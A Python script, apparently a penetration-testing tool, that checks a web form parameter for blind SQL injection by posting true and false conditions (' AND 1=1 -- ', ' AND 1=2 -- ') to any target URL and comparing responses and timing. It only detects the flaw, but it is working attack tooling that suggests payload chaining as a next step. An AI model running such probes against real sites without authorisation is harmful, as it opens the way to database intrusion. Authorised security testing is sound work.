import requests
import time
import argparse
import difflib

class BlindSQLiDetector:
    def __init__(self, target_url, param_name, cookies=None, proxies=None):
        self.target_url = target_url
        self.param_name = param_name
        self.session = requests.Session()
        if cookies:
            self.session.cookies.update(cookies)
        self.proxies = proxies
        self.true_condition = " AND 1=1 -- "
        self.false_condition = " AND 1=2 -- "
    
    def send_request(self, payload):
        """Send a single request and return response text + elapsed time."""
        data = {self.param_name: "test" + payload}  # Example: POST parameter
        start = time.perf_counter()
        response = self.session.post(self.target_url, data=data, proxies=self.proxies, timeout=10)
        elapsed = time.perf_counter() - start
        return response.text, elapsed, response.status_code
    
    def is_vulnerable(self):
        """Test for boolean-based blind SQLi by comparing true/false responses."""
        print(f"[+] Testing {self.target_url} for Blind SQLi on parameter '{self.param_name}'...")
        
        # Baseline request (no payload)
        baseline_text, _, _ = self.send_request("")
        
        # True condition
        true_text, true_time, true_code = self.send_request(self.true_condition)
        
        # False condition
        false_text, false_time, false_code = self.send_request(self.false_condition)
        
        # Compare responses
        if true_code != false_code:
            print("[!] Different status codes - possible injection point!")
            return True
        
        # Content difference check
        diff = difflib.SequenceMatcher(None, true_text, false_text).ratio()
        if diff < 0.95:  # Threshold can be tuned
            print("[!] Content differs significantly between true/false conditions - Blind SQLi confirmed!")
            return True
        
        # Optional time-based fallback check
        if abs(true_time - false_time) > 2.0:  # If one is much slower
            print("[!] Timing difference detected - possible time-based Blind SQLi!")
            return True
        
        print("[-] No clear difference detected. May not be vulnerable or WAF is blocking.")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Custom Blind SQLi Detector")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--param", required=True, help="Vulnerable parameter name")
    args = parser.parse_args()
    
    detector = BlindSQLiDetector(args.url, args.param)
    if detector.is_vulnerable():
        print("[+] Vulnerability confirmed! Recommend further manual testing or payload chaining.")
    else:
        print("[-] No vulnerability detected with current payloads.")